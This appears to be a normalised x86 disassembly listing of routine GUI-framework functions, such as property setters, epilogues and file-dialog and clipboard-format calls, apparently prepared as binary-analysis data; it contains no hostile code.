pop ebp
retn
sub_432859
jmp sub_403980
sub_432860
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43291f
jmp sub_403980
sub_432926
pop ebx
mov esp ebp
pop ebp
retn
sub_4329d8
cmp [ eax + 0x3c ] 0x0
je r-xdata
mov eax [ eax + 0x64 ]
retn
mov eax [ eax + 0x68 ]
retn
sub_432a40
push ebx
mov ebx eax
mov edx GetOpenFileNameA
mov eax ebx
call sub_432468
cmp eax 0x1
sbb eax eax
inc eax
pop ebx
retn
sub_432a58
push ebx
cmp [ eax + 0xaa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0xac ]
call [ ebx + 0xa8 ]
sub_432a74
push ebx
mov ebx eax
mov edx GetSaveFileNameA
mov eax ebx
call sub_432468
cmp eax 0x1
sbb eax eax
inc eax
pop ebx
retn
sub_432b9d
jmp sub_403980
sub_432ba4
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_432c6a
jmp sub_403980
sub_432c71
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_432d4c
push esi
mov esi eax
mov eax [ esi + 0x60 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_432e58
push ebx
cmp [ eax + 0x62 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
sub_432efb
jmp sub_4036cc
sub_4330b5
jmp sub_403980
sub_4330bc
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4330c8
push esi
mov esi eax
mov eax [ esi + 0x58 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_433175
jmp sub_403980
sub_43317c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43327c
jmp sub_403980
sub_4332f8
jmp sub_403980
sub_4332ff
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43338a
jmp sub_403980
sub_43366f
jmp sub_403980
sub_433676
pop ecx
pop ebp
retn 0x8
sub_433a68
jmp sub_4036cc
sub_433d90
call sub_4031ec
retn
sub_434118
push ebx
cmp [ eax + 0x72 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x74 ]
call [ ebx + 0x70 ]
sub_43412c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
lea edx [ ebx + 0xac ]
mov ecx 0x100
call sub_4041ec
pop esi
pop ebx
retn
sub_434148
push ebx
add esp 0xfffffff8
mov ebx eax
mov edx esp
mov eax ebx
call sub_434160
mov eax [ esp ]
pop ecx
pop edx
pop ebx
retn
sub_434194
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
lea edx [ ebx + 0x1ac ]
mov ecx 0x100
call sub_4041ec
pop esi
pop ebx
retn
sub_4341b0
push ebx
add esp 0xfffffff8
mov ebx eax
mov edx esp
mov eax ebx
call sub_434160
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebx
retn
sub_4342aa
add [ eax ] al
push ebx
cmp [ eax + 0x7a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x7c ]
call [ ebx + 0x78 ]
sub_434592
jmp sub_403980
sub_434599
pop ebp
retn
sub_435422
pop edi
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
sub_4358f4
xor edx edx
mov ecx [ eax + 0x168 ]
mov ecx [ ecx + 0xc ]
test ecx ecx
je r-xdata
mov eax edx
retn
mov eax ecx
mov edx [ eax ]
call [ edx + 0x24 ]
mov edx eax
sub_435aed
jmp sub_403980
sub_435af4
pop ebx
mov esp ebp
pop ebp
retn
sub_435c00
cmp dl [ eax + 0x179 ]
je r-xdata
retn
mov [ eax + 0x179 ] dl
mov edx eax
call sub_435c70
sub_435c18
push esi
mov esi eax
mov eax [ esi + 0x168 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_435c28
cmp dl [ eax + 0x178 ]
je r-xdata
retn
mov [ eax + 0x178 ] dl
mov edx eax
call sub_435c70
sub_435c40
cmp dl [ eax + 0x17b ]
je r-xdata
retn
mov [ eax + 0x17b ] dl
mov edx eax
call sub_435c70
sub_435c58
cmp dl [ eax + 0x17d ]
je r-xdata
retn
mov [ eax + 0x17d ] dl
mov edx eax
call sub_435c70
sub_435ec2
jmp sub_4036cc
sub_435f7b
jmp sub_403980
sub_435f82
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_435f88
cmp dl [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] dl
call sub_435efc
sub_435f98
cmp edx [ eax + 0x30 ]
je r-xdata
retn
mov [ eax + 0x30 ] edx
call sub_435efc
sub_435fa8
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x38 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x3c ] edx
call sub_435efc
pop ebp
retn 0x8
sub_435fc0
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_4360ec
push ebx
mov ebx eax
mov eax ebx
call sub_45b920
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_436100
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_436134
cmp [ eax + 0x21e ] 0x0
jne r-xdata
retn
mov [ edx + 0xc ] 0x1
sub_436238
jmp sub_403980
sub_43623f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4363e2
jmp sub_403980
sub_4363e9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4363f3
inc [ ecx ]
add [ eax ] al
add [ edi ] dl
add [ eax ] al
mov [ eax + 0x220 ] dl
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_436408
push ebx
mov ebx eax
mov [ ebx + 0x211 ] dl
mov eax ebx
call sub_458c08
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_436440
push ebx
mov ebx eax
mov [ ebx + 0x214 ] edx
mov eax ebx
call sub_458c08
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_43645c
push ebx
mov ebx eax
mov [ ebx + 0x218 ] edx
mov eax ebx
call sub_458c08
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_436478
cmp dl [ eax + 0x21c ]
je r-xdata
retn
mov [ eax + 0x21c ] dl
call sub_4598e8
sub_43648c
mov al [ eax + 0x220 ]
retn
sub_4365f5
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x0
retn
sub_43660d
jmp sub_403980
sub_4369bf
retn
sub_4369c0
jmp sub_403980
j_sub_4369bf
jmp sub_4369bf
sub_4369c7
pop ebp
retn
sub_4369cc
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403d04
mov eax [ r-xdata ]
call sub_4183f8
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_418444
sub_436a69
jmp sub_403980
sub_436a70
pop ebp
retn
sub_436a74
sub [ rw-data ] 0x1
retn
sub_436aad
jmp sub_403980
sub_436ab4
pop ebp
retn
sub_436ab8
sub [ rw-data ] 0x1
jae r-xdata
retn
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
xor eax eax
mov [ rw-data ] eax
sub_436b34
retn
sub_436b35
jmp sub_403980
j_sub_436b34
jmp sub_436b34
sub_436b3c
pop ebp
retn
sub_436b40
sub [ rw-data ] 0x1
retn
sub_436d9c
jmp r-xdata
sub_437588
mov eax [ eax + 0x4 ]
cmp [ eax + 0x8 ] 0x0
sete al
retn
sub_437d0b
jmp sub_403980
sub_437d47
jmp sub_403980
sub_438952
jmp sub_403980
sub_438959
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_438be0
call sub_456f88
retn
sub_438be8
push ebx
mov ebx eax
mov eax ebx
call sub_438c04
mov edx [ eax ]
call [ edx + 0x24 ]
pop ebx
retn
sub_438bfc
mov eax [ r-xdata ]
retn
sub_438c04
mov eax [ eax + 0x16c ]
mov eax [ eax + 0x4 ]
retn
sub_438c10
push esi
mov esi eax
mov eax [ esi + 0x16c ]
call sub_4376f8
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
pop esi
retn
sub_438c28
mov eax [ eax + 0x16c ]
mov al [ eax + 0x20 ]
retn
sub_438c60
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_438d10
push esi
mov esi eax
cmp dl [ esi + 0x180 ]
je r-xdata
pop esi
retn
mov [ esi + 0x180 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_438d2c
cmp edx [ eax + 0x168 ]
je r-xdata
retn
mov [ eax + 0x168 ] edx
call sub_438c68
sub_438d40
push esi
mov esi eax
cmp dl [ esi + 0x173 ]
je r-xdata
pop esi
retn
mov [ esi + 0x173 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_438d5c
push esi
mov esi eax
cmp edx [ esi + 0x17c ]
je r-xdata
pop esi
retn
cmp edx 0xffffffff
jl r-xdata
mov [ esi + 0x17c ] edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_438d7c
push esi
mov esi eax
cmp edx [ esi + 0x174 ]
je r-xdata
pop esi
retn
mov [ esi + 0x174 ] edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_438dd4
cmp dl [ eax + 0x172 ]
je r-xdata
retn
mov [ eax + 0x172 ] dl
call sub_438c68
sub_438de8
push esi
mov esi eax
mov eax esi
call sub_457138
cmp [ esi + 0x170 ] 0x0
je r-xdata
pop esi
retn
mov eax esi
mov si 0xffe9
call sub_4033e8
sub_438f35
jmp sub_403980
sub_438f3c
pop edi
pop esi
pop ecx
pop ebp
retn
sub_438f44
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_438f4c
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_438f54
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x16c ]
mov eax esi
call sub_437684
mov dl [ ebx + 0x182 ]
mov eax esi
call sub_437798
pop esi
pop ebx
retn
sub_439184
push ebx
push esi
mov bl 0xb
mov esi rw-data
mov eax [ esi ]
call sub_4031ec
add esi 0x4
dec bl
jne r-xdata
pop esi
pop ebx
retn
sub_439247
retn
sub_439248
jmp sub_403980
j_sub_439247
jmp sub_439247
sub_43924f
pop ebp
retn
sub_439254
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403d50
mov eax rw-data
xor ecx ecx
mov edx 0x2c
call sub_402bf8
sub_43990d
jmp sub_403980
sub_4399bc
push ebx
mov ebx eax
mov eax ebx
call sub_40443c
push eax
call GetFileAttributesA
cmp eax 0xffffffff
setne al
pop ebx
retn
sub_439b10
jmp sub_4036cc
sub_439bac
jmp sub_403980
sub_439bb3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_439bbc
call sub_43208c
mov eax [ rw-data ]
mov eax [ eax ]
call sub_47654c
retn
sub_439ca8
jmp sub_403980
sub_439caf
pop ebx
mov esp ebp
pop ebp
retn
sub_439cb4
mov edx [ rw-data ]
cmp [ edx ] 0x0
je r-xdata
xor edx edx
mov [ eax + 0x44 ] edx
test [ eax + 0x5e ] 0x1
jne r-xdata
mov edx r-xdata
mov [ eax + 0x44 ] edx
jmp r-xdata
call sub_432a40
retn
sub_439f32
jmp sub_403980
sub_439f39
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439f56
lea eax [ ebp - 0x8 ]
call sub_403f7c
retn
sub_439f4f
jmp sub_403980
sub_439f56
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_439f92
add [ eax ] al
cmp [ ecx ] 0x1b
jne r-xdata
retn
mov eax edx
call sub_472264
sub_43a033
jmp sub_403980
sub_43a03a
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_43a065
jmp sub_403980
sub_43a06c
pop ebp
retn
sub_43a070
sub [ rw-data ] 0x1
retn
sub_43a0cc
jmp sub_403980
sub_43a0d3
pop ebp
retn
sub_43a0d8
sub [ rw-data ] 0x1
retn
sub_43a134
jmp sub_403980
sub_43a13b
pop ebp
retn
sub_43a140
sub [ rw-data ] 0x1
retn
sub_43a1a1
jmp sub_403980
sub_43a1a8
pop ebp
retn
sub_43a1ac
sub [ rw-data ] 0x1
retn
sub_43a1f8
jmp sub_403980
sub_43a1ff
pop ebp
retn
sub_43a204
sub [ rw-data ] 0x1
retn
sub_43af9b
jmp sub_403980
sub_43afa8
mov edx [ eax + 0xc ]
test edx edx
je r-xdata
retn
xchg edx eax
mov ecx [ eax ]
call [ ecx + 0x1c ]
sub_43b020
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x10 ]
mov edx esi
call sub_403fd0
mov eax ebx
call sub_43afa8
pop esi
pop ebx
retn
sub_43b03c
mov [ eax + 0x14 ] edx
call sub_43afa8
retn
sub_43b048
mov [ eax + 0x18 ] edx
call sub_43afa8
retn
sub_43b080
push ebx
mov ebx eax
mov eax ebx
call sub_4199ac
mov [ eax + 0xc ] ebx
pop ebx
retn
sub_43b200
cmp dl [ eax + 0x1d ]
je r-xdata
retn
mov [ eax + 0x1d ] dl
test dl dl
je r-xdata
mov edx sub_43b054
call sub_43b090
sub_43b218
mov edx sub_43b054
call sub_43b090
retn
sub_43b3dd
jmp sub_403980
sub_43b418
push ebx
mov ebx ecx
mov eax ebx
call sub_403f7c
pop ebx
retn
sub_43b424
mov al 0x1
retn
sub_43b529
jmp sub_403980
sub_43b624
retn
sub_43b747
jmp sub_403980
sub_43b74e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43ba98
mov eax [ eax + 0xd0 ]
call sub_419b1c
retn
sub_43bb08
mov eax [ r-xdata ]
retn
sub_43bb34
push esi
mov esi eax
mov eax [ esi + 0xd0 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_43bb68
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403378
pop ebx
retn
sub_43bc58
retn
sub_43bd9f
jmp sub_403980
sub_43bda6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43bdb0
retn
sub_43bdd3
jmp sub_403980
sub_43bdda
pop ebp
retn 0x4
sub_43be3d
jmp sub_403980
sub_43be44
pop ebp
retn
sub_43be48
sub [ rw-data ] 0x1
retn
sub_440e28
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov eax r-xdata
call sub_40c3a4
mov [ rw-data ] eax
sub_440f50
cmp dl [ eax + 0x16 ]
je r-xdata
retn
mov [ eax + 0x16 ] dl
mov [ eax + 0x17 ] 0x0
xor edx edx
call sub_419798
sub_440f64
mov al [ eax + 0x17 ]
xor al 0x1
retn
sub_440f6c
cmp dl [ eax + 0x17 ]
je r-xdata
retn
mov [ eax + 0x17 ] dl
call sub_440f7c
sub_440fb4
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x16 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_441008
cmp dl [ eax + 0x14 ]
je r-xdata
retn
mov [ eax + 0x14 ] dl
xor edx edx
call sub_419798
sub_441018
cmp dl [ eax + 0x15 ]
je r-xdata
retn
mov [ eax + 0x15 ] dl
xor edx edx
call sub_419798
sub_441028
cmp dl [ eax + 0x18 ]
je r-xdata
retn
mov [ eax + 0x18 ] dl
xor edx edx
call sub_419798
sub_4410d0
push ebx
mov ebx eax
mov eax ebx
call sub_4199ac
pop ebx
retn
sub_4410f0
mov eax [ eax + 0x18 ]
retn
sub_441378
push esi
mov esi eax
mov eax [ esi + 0x208 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_44168e
jmp sub_403980
sub_4416f4
cmp dl [ eax + 0x215 ]
je r-xdata
retn
mov [ eax + 0x215 ] dl
mov dl 0x1
call sub_441ce4
sub_44189c
jmp sub_403980
sub_4418a3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_441afa
jmp sub_403980
sub_441b01
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
pop esi
mov esp ebp
pop ebp
retn
sub_441b10
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x210 ]
call sub_40423c
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_441b6c
cmp [ eax + 0x217 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x59 ] 0x0
jne r-xdata
cmp [ eax + 0x56 ] 0x0
je r-xdata
mov al 0x1
retn
sub_441bb8
push ebx
mov ebx eax
mov eax ebx
call sub_45b87c
mov eax ebx
call sub_4598e8
pop ebx
retn
sub_441bcc
push ebx
mov ebx eax
mov eax ebx
call sub_45771c
cmp [ ebx + 0x217 ] 0x0
je r-xdata
pop ebx
retn
cmp [ ebx + 0x59 ] 0x0
je r-xdata
mov [ ebx + 0x217 ] 0x0
sub_441c68
push ebx
mov ebx eax
mov eax ebx
call sub_45b9e0
mov eax ebx
call sub_4598e8
pop ebx
retn
sub_441c7c
push ebx
mov ebx eax
mov eax ebx
call sub_45ba70
mov eax ebx
call sub_44170c
pop ebx
retn
sub_441c90
push ebx
mov ebx ecx
cmp [ eax + 0x217 ] 0x0
je r-xdata
mov ecx ebx
call sub_45be54
pop ebx
retn
mov cl [ r-xdata ]
mov [ eax + 0x98 ] cl
sub_441cdc
call sub_455920
retn
sub_441dac
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_441070
retn
sub_441dbc
mov eax [ r-xdata ]
retn
sub_441e24
push ebp
mov ebp esp
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
pop ebx
pop ebp
retn 0x4
sub_441e38
push ebp
mov ebp esp
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop ebx
pop ebp
retn 0x4
sub_442164
push esi
mov [ eax + 0x218 ] dx
mov [ eax + 0x21a ] cx
mov si 0xffb3
call sub_4033e8
pop esi
retn
sub_442220
cmp [ eax + 0x228 ] 0x1
jne r-xdata
mov dl 0x1
call sub_4427e8
retn
xor edx edx
call sub_4427e8
retn
sub_442274
push ebx
cmp [ eax + 0x222 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x224 ]
call [ ebx + 0x220 ]
sub_4424a2
jmp sub_403980
sub_4424a9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_442764
jmp sub_403980
sub_44276b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_442b5a
jmp sub_403980
sub_442c92
jmp sub_403980
sub_442c99
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_442cf4
mov al [ eax + 0xd ]
xor al 0x1
retn
sub_442d94
cmp edx [ eax + 0x1c ]
je r-xdata
retn
mov [ eax + 0x1c ] edx
call sub_442b70
sub_442da4
cmp edx [ eax + 0x14 ]
je r-xdata
retn
mov [ eax + 0x14 ] edx
xor edx edx
call sub_419798
sub_442db4
cmp edx [ eax + 0x18 ]
je r-xdata
retn
mov [ eax + 0x18 ] edx
xor edx edx
call sub_419798
sub_442eb8
mov eax [ eax + 0x18 ]
retn
sub_442fcb
jmp sub_403980
sub_443020
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x1c ]
call sub_403fd0
pop esi
pop ebx
retn
sub_44312e
jmp sub_403980
sub_443135
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_443330
push ebx
mov ebx eax
mov eax ebx
call sub_41ae4c
mov eax [ ebx + 0x34 ]
mov edx [ eax ]
call [ edx + 0x8 ]
pop ebx
retn
sub_443368
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
call sub_443bf4
retn
sub_443440
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
call sub_443cfc
retn
sub_44344c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x34 ]
call sub_418dc4
pop esi
pop ebx
retn
sub_443460
mov eax [ eax + 0x34 ]
call sub_418f10
retn
sub_443530
push ebx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_443528
cmp ebx [ eax + 0x28c ]
je r-xdata
mov eax ebx
call sub_4031ec
sub_4435f8
push ebx
mov ebx eax
mov eax ebx
call sub_443a48
push eax
mov eax ebx
call sub_443554
pop edx
call sub_42c93c
pop ebx
retn
sub_443a25
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_443a34
push esi
mov esi eax
test edx edx
je r-xdata
pop esi
retn
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_443a48
mov edx [ eax + 0x4 ]
mov ecx [ edx + 0x4 ]
cmp [ ecx + 0x244 ] 0x0
je r-xdata
xchg edx eax
call sub_443c80
retn
mov eax [ eax + 0x18 ]
retn
sub_443a94
mov eax [ eax + 0x8 ]
call sub_44344c
retn
sub_443b74
or ecx 0xffffffff
xor edx edx
call sub_443b80
retn
sub_443ca8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_443bf4
mov ecx 0x1
mov edx esi
call sub_42ca28
pop esi
pop ebx
retn
sub_443cc4
push ebx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_45c684
test al al
je r-xdata
pop ebx
retn
mov eax ebx
call sub_443bf4
call sub_42c76c
sub_443ce4
push ebx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
inc [ ebx + 0x8 ]
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_443cfc
sub_443e7d
jmp sub_403980
sub_443ec0
dec [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
retn
xor edx edx
call sub_443cfc
sub_4441d8
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x14 ]
call sub_40278c
retn
sub_4441e4
jmp sub_403980
j_sub_4441d8
jmp sub_4441d8
sub_4441eb
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44420d
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_403fa0
retn
sub_444206
jmp sub_403980
sub_44420d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44449b
jmp sub_403980
sub_4444a2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4444c4
lea eax [ ebp - 0x38 ]
mov edx 0x2
call sub_403fa0
retn
sub_4444bd
jmp sub_403980
sub_4444c4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4444cc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_443c00
call sub_443530
pop esi
pop ebx
retn
sub_4444e4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x6
mov [ eax + 0x4 ] edx
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0x1c ] 0xffffffff
mov [ eax + 0x20 ] ecx
pop ebp
retn 0x4
sub_44457c
cmp dl [ eax + 0x8 ]
je r-xdata
retn
mov [ eax + 0x8 ] dl
mov eax [ eax + 0x4 ]
call sub_4598e8
sub_444590
cmp dl [ eax + 0x9 ]
je r-xdata
retn
mov [ eax + 0x9 ] dl
mov eax [ eax + 0x4 ]
call sub_4598e8
sub_4445a4
cmp dl [ eax + 0xa ]
je r-xdata
retn
mov [ eax + 0xa ] dl
mov eax [ eax + 0x4 ]
call sub_4598e8
sub_444ac0
jmp sub_403980
sub_444c16
jmp sub_403980
sub_444f6d
jmp sub_403980
sub_444f74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444f97
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_4051c0
retn
sub_444f90
jmp sub_403980
sub_444f97
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_445075
jmp sub_4036cc
sub_44507a
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_4759fc
call sub_403a34
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_445175
jmp sub_4036cc
sub_44517a
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_4759fc
call sub_403a34
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_445440
cmp dl [ eax + 0x277 ]
je r-xdata
retn
mov [ eax + 0x277 ] dl
call sub_4451b4
sub_445454
cmp dl [ eax + 0x278 ]
je r-xdata
retn
mov [ eax + 0x278 ] dl
call sub_4451b4
sub_4454bc
cmp dl [ eax + 0x245 ]
je r-xdata
retn
mov [ eax + 0x245 ] dl
call sub_4598e8
sub_4454d0
cmp dl [ eax + 0x27a ]
je r-xdata
retn
mov [ eax + 0x27a ] dl
call sub_4451b4
sub_4454e4
cmp dl [ eax + 0x275 ]
je r-xdata
retn
mov [ eax + 0x275 ] dl
call sub_4451b4
sub_4454f8
cmp dl [ eax + 0x276 ]
je r-xdata
retn
mov [ eax + 0x276 ] dl
call sub_4451b4
sub_44550c
cmp dl [ eax + 0x214 ]
je r-xdata
retn
mov [ eax + 0x214 ] dl
call sub_4598e8
sub_445520
cmp dl [ eax + 0x22a ]
je r-xdata
retn
mov [ eax + 0x22a ] dl
call sub_4598e8
sub_44557c
cmp dl [ eax + 0x228 ]
je r-xdata
retn
mov [ eax + 0x228 ] dl
call sub_4598e8
sub_445590
cmp dl [ eax + 0x22b ]
je r-xdata
retn
mov [ eax + 0x22b ] dl
call sub_4598e8
sub_4455a4
push ebx
mov ebx eax
mov eax [ ebx + 0x68 ]
mov eax [ eax + 0x18 ]
call sub_4242e8
push eax
mov eax ebx
call sub_45c380
pop edx
call sub_42c8e4
pop ebx
retn
sub_44586f
jmp sub_403980
sub_445876
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_445894
cmp [ eax + 0x215 ] 0x3
sete al
retn
sub_4458a0
cmp [ eax + 0x264 ] 0x0
setne al
retn
sub_4458ec
cmp dl [ eax + 0x238 ]
je r-xdata
retn
mov [ eax + 0x238 ] dl
call sub_4598e8
sub_445900
cmp dl [ eax + 0x216 ]
je r-xdata
retn
mov [ eax + 0x216 ] dl
call sub_4598e8
sub_445b48
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_443b0c
retn
sub_445cc5
jmp sub_403980
sub_445ccc
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_445cd8
push ebx
mov ebx eax
mov eax ebx
call sub_45c380
call sub_42ca54
pop ebx
retn
sub_445fc9
jmp sub_403980
sub_446373
jmp sub_403980
sub_446539
jmp sub_403980
sub_446a0e
jmp sub_403980
sub_446a15
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_446a90
push ebx
cmp [ eax + 0x2d2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x2d4 ]
call [ ebx + 0x2d0 ]
sub_446ae0
push ebx
cmp [ eax + 0x362 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x364 ]
call [ ebx + 0x360 ]
sub_446b59
jmp sub_403980
sub_446b60
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_446cbd
jmp sub_403980
sub_446cc4
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_447024
mov eax [ eax + 0x22c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_447030
push esi
mov esi eax
mov eax [ esi + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_44729c
mov eax [ eax + 0x23c ]
call sub_442ea0
retn
sub_447328
push ebx
cmp [ eax + 0x34a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x34c ]
call [ ebx + 0x348 ]
sub_447963
jmp sub_403980
sub_447980
jmp sub_403980
sub_447987
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_447add
jmp sub_403980
sub_447ae4
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_447af4
mov [ eax + 0x28a ] 0x1
retn
sub_447f57
jmp sub_403980
sub_447f5e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_447f90
mov [ eax + 0x294 ] dl
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_4480b5
jmp sub_403980
sub_4480bc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4480c4
push ebx
cmp [ eax + 0x35a ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x35c ]
call [ ebx + 0x358 ]
sub_448108
push ebx
mov ebx eax
mov eax ebx
call sub_45c380
call sub_42cae0
pop ebx
retn
sub_448395
jmp sub_403980
sub_44839c
pop esi
